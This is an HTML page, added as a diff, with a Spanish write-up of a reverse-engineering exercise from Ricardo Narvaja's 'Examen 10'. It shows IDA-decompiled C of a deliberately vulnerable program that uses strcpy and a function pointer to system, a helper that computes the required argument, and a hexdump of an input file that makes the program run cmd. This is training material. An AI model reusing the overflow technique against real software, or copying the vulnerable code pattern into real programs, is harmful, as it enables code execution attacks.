@@ -1,0 +1,176 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<title>Ricardo Narvaja: Examen 10 (Ejecutar calculadora no es un bufferoverflow) | Index</title>
+<meta name="robots" content='index, follow'>
+<meta name="description" content="">
+<meta name="generator" content="hugo-index">
+<link crossorigin="anonymous" href="https://adityatelange.github.io/assets/stylesheet.css" rel="preload stylesheet" as="style">
+<script crossorigin="anonymous" src="https://adityatelange.github.io/assets/quicklink.js" rel="preload" as="script"></script>
+<script>
+    window.addEventListener('load', () => {
+        quicklink.listen();
+    });
+</script>
+
+  </head>
+  <body><header>
+  <h1>
+    <a href="https://adityatelange.github.io/">
+      <img src="https://adityatelange.github.io/index.png" alt="Index">
+      <span>Index</span>
+    </a>
+    <span class="hl">/</span>
+    <a href="https://adityatelange.github.io/buffer_overflow_10/">
+      <span>Ricardo Narvaja: Examen 10 (Ejecutar calculadora no es un bufferoverflow)</span>
+    </a>
+  </h1>
+  <p class="desc"></p>
+</header>
+<div class="main">
+
+<ul class="tagsList single">
+  
+  <li><a href="https://adityatelange.github.io/@reversing/">Reversing</a></li>
+  
+  <li><a href="https://adityatelange.github.io/@ricardo/">Ricardo</a></li>
+  
+  <li><a href="https://adityatelange.github.io/@narvaja/">Narvaja</a></li>
+  
+  <li><a href="https://adityatelange.github.io/@examen/">Examen</a></li>
+  
+  <li><a href="https://adityatelange.github.io/@ida/">Ida</a></li>
+  
+</ul>
+
+<div class="content"><p>No me funcionaba con wine en linux porque verifica si argc == 2 y si ejecutás <code>wine EXAMEN_10.exe 49</code> el argc vale 3, así que tuve que ejecutar el exploit en windows. En linux en vez de usar calc uso cmd porque calc no está disponible a nivel global.</p>
+<p>El código que me generó el ida con algunas modificaciones</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">_DWORD</span> <span class="o">*</span><span class="n">__thiscall</span> <span class="nf">this_106</span><span class="p">(</span><span class="n">_DWORD</span> <span class="o">*</span><span class="n">this</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="n">this</span><span class="p">[</span><span class="mi">106</span><span class="p">]</span> <span class="o">=</span> <span class="s">&#34;A ejecutar la calculadora de nuevo...</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="n">this</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="kr">__cdecl</span> <span class="nf">check2</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">Destination</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">strcat</span><span class="p">(</span><span class="n">Destination</span><span class="p">,</span> <span class="o">*</span><span class="p">(</span><span class="n">Destination</span> <span class="o">+</span> <span class="mi">106</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">  <span class="c1">//  Tenemos que hacer que la longitud de Destination valga 56 ya tenemos 38 bytes de la cadena &#34;A ejecutar la calculadora de nuevo...\n&#34; y ahora tenemos que hacer que Destination tenga 18. 18+38=56.
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="c1">// Para lograr eso tenemos que agregar un 0 en la posición 18 porque strcpy copia hasta donde hay un 0.
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl">  <span class="c1">// Voy a ejecutar cmd porque wine no tiene calc.exe
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="k">if</span> <span class="p">(</span> <span class="nf">strlen</span><span class="p">(</span><span class="n">Destination</span><span class="p">)</span> <span class="o">==</span> <span class="mi">56</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl">  <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span> <span class="n">Destination</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span> <span class="o">==</span> <span class="sc">&#39;I&#39;</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl">      <span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="n">Destination</span> <span class="o">+</span> <span class="mi">52</span><span class="p">))(</span><span class="n">Destination</span> <span class="o">+</span> <span class="mi">254</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span> <span class="n">Destination</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span> <span class="o">==</span> <span class="sc">&#39;P&#39;</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl">      <span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="n">Destination</span> <span class="o">+</span> <span class="mi">53</span><span class="p">))(</span><span class="n">Destination</span> <span class="o">+</span> <span class="mi">254</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span> <span class="n">Destination</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span> <span class="o">==</span> <span class="sc">&#39;Q&#39;</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl">      <span class="c1">// Este queremos que se ejecute porque en Destination[54] está el puntero a system y Destination[254] es igual a Buffer[30]
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl">      <span class="c1">// Esto es lo mismo que system(Buffer[30])
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>      <span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="n">Destination</span> <span class="o">+</span> <span class="mi">54</span><span class="p">))(</span><span class="n">Destination</span> <span class="o">+</span> <span class="mi">254</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span> <span class="n">Destination</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span> <span class="o">==</span> <span class="sc">&#39;R&#39;</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl">      <span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="n">Destination</span> <span class="o">+</span> <span class="mi">55</span><span class="p">))(</span><span class="n">Destination</span> <span class="o">+</span> <span class="mi">254</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="kr">__cdecl</span> <span class="nf">check</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">Destination</span><span class="p">,</span> <span class="kt">int</span> <span class="n">a2</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="c1">// Acá le resta &#39;1&#39; al puntero a system, vamos a ver que significa 1 en hexa.
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="c1">// 1 en hexadecimal = 31
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="c1">// Entonces tenemos que hacer que v12 valga 49, no sé bien por qué 
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="c1">// system+49-&#39;1&#39; = system
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="n">Destination</span><span class="p">[</span><span class="mi">54</span><span class="p">]</span> <span class="o">=</span> <span class="n">a2</span> <span class="o">-</span> <span class="sc">&#39;1&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">check2</span><span class="p">(</span><span class="n">Destination</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="kr">__cdecl</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">envp</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">char</span> <span class="n">Destination</span><span class="p">[</span><span class="mi">204</span><span class="p">];</span> <span class="c1">// [esp+0h] [ebp-1B4h] BYREF
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="n">FILE</span> <span class="o">*</span><span class="n">Stream</span><span class="p">;</span> <span class="c1">// [esp+CCh] [ebp-E8h]
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">int</span> <span class="p">(</span><span class="o">*</span><span class="n">imprimir</span><span class="p">)(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="k">const</span><span class="p">,</span> <span class="p">...);</span> <span class="c1">// [esp+D0h] [ebp-E4h]
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">int</span> <span class="p">(</span><span class="o">*</span><span class="n">v7</span><span class="p">)(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="k">const</span><span class="p">,</span> <span class="p">...);</span> <span class="c1">// [esp+D4h] [ebp-E0h]
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">int</span> <span class="p">(</span><span class="o">*</span><span class="n">v8</span><span class="p">)(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="k">const</span><span class="p">,</span> <span class="p">...);</span> <span class="c1">// [esp+D8h] [ebp-DCh]
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">int</span> <span class="p">(</span><span class="o">*</span><span class="n">v9</span><span class="p">)(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="k">const</span><span class="p">,</span> <span class="p">...);</span> <span class="c1">// [esp+DCh] [ebp-D8h]
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">char</span> <span class="n">Buffer</span><span class="p">[</span><span class="mi">200</span><span class="p">];</span> <span class="c1">// [esp+E0h] [ebp-D4h] BYREF
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">v11</span><span class="p">;</span> <span class="c1">// [esp+1A8h] [ebp-Ch]
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">int</span> <span class="n">v12</span><span class="p">;</span> <span class="c1">// [esp+1ACh] [ebp-8h]
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">int</span> <span class="n">v13</span><span class="p">;</span> <span class="c1">// [esp+1B0h] [ebp-4h]
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl">  <span class="nf">this_106</span><span class="p">(</span><span class="n">Destination</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="n">imprimir</span> <span class="o">=</span> <span class="n">printf</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">v7</span> <span class="o">=</span> <span class="n">printf</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">v8</span> <span class="o">=</span> <span class="n">printf</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">v9</span> <span class="o">=</span> <span class="n">printf</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">printf</span><span class="p">(</span><span class="n">v11</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="n">v13</span> <span class="o">=</span> <span class="n">printf</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">memset</span><span class="p">(</span><span class="n">Buffer</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">Buffer</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">memset</span><span class="p">(</span><span class="n">Destination</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">200u</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="c1">// Carga el contenido del archivo en Stream
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="n">Stream</span> <span class="o">=</span> <span class="nf">fopen</span><span class="p">(</span><span class="s">&#34;example.txt&#34;</span><span class="p">,</span> <span class="s">&#34;rb&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="n">Stream</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl">  <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">imprimir</span><span class="p">(</span><span class="s">&#34;No se puede leer el archivo bye bye </span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="c1">// De stream copia 200 bytes a Buffer
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="nf">fread</span><span class="p">(</span><span class="n">Buffer</span><span class="p">,</span> <span class="mi">200u</span><span class="p">,</span> <span class="mi">1u</span><span class="p">,</span> <span class="n">Stream</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="c1">// De buffer lo copia a Destination
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="nf">strcpy</span><span class="p">(</span><span class="n">Destination</span><span class="p">,</span> <span class="n">Buffer</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="c1">// Si hay un argumentos
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="k">if</span> <span class="p">(</span> <span class="n">argc</span> <span class="o">==</span> <span class="mi">2</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl">  <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="c1">// Transforma a entero el 2do argumento
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="c1">// v12 tiene que valer 31 entonces.
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">v12</span> <span class="o">=</span> <span class="nf">atoi</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl">    <span class="c1">// Acá suma el puntero a system con v12, no necesitamos v12 sólo queremos el puntero a system.
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="c1">// v13 = system + 49
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">v13</span> <span class="o">=</span> <span class="n">system</span> <span class="o">+</span> <span class="n">v12</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">check</span><span class="p">(</span><span class="n">Destination</span><span class="p">,</span> <span class="n">v13</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">imprimir</span><span class="p">(</span><span class="s">&#34;</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="c1">// Buffer[30] = Destination[254]
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="nf">imprimir</span><span class="p">(</span><span class="o">&amp;</span><span class="n">Buffer</span><span class="p">[</span><span class="mi">30</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><h3 id="con-este-código-me-dí-cuenta-que-tenía-que-pasarle-49-como-argumento">Con este código me dí cuenta que tenía que pasarle 49 como argumento:</h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
+</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">argv</span><span class="p">[]){</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="c1">// a = 61
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="c1">// 1 = 31
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="nf">printf</span><span class="p">(</span><span class="s">&#34;atoi(%s): %d</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span><span class="nf">atoi</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]));</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="nf">printf</span> <span class="p">(</span><span class="s">&#34;argc: %d</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span><span class="n">argc</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="kt">char</span> <span class="n">a</span> <span class="o">=</span> <span class="sc">&#39;a&#39;</span> <span class="o">-</span> <span class="sc">&#39;1&#39;</span> <span class="o">+</span> <span class="nf">atoi</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="nf">printf</span><span class="p">(</span><span class="s">&#34;a = 61, 1 = 31</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="nf">printf</span><span class="p">(</span><span class="s">&#34;&#39;%c&#39;-&#39;1&#39;+atoi(%s): %x</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span><span class="sc">&#39;a&#39;</span><span class="p">,</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span><span class="n">a</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><h4 id="exploit">Exploit</h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">00000000: 5151 5151 5151 5151 5151 5151 5151 5151  QQQQQQQQQQQQQQQQ
+</span></span><span class="line"><span class="cl">00000010: 5100 5151 5151 5151 5151 5151 5151 636d  Q.QQQQQQQQQQQQcm
+</span></span><span class="line"><span class="cl">00000020: 64                                       d
+</span></span></code></pre></div><p>Es muy parecido al otro sólo que verifica la cantidad de argumentos y tiene un puntero a system que le resta &lsquo;1&rsquo; en char y tenés que sumarle 49 para recuperar la dirección del puntero a system.</p>
+</div></div><footer>
+    <hr>
+    <div class="footer-text">
+        <div>© 2024 Index</div>
+        <div>Powered by <a href="https://gohugo.io/">Hugo</a> & <a
+                href="https://github.com/adityatelange/hugo-index/">Index</a></div>
+    </div>
+</footer>
+</body>
+</html>
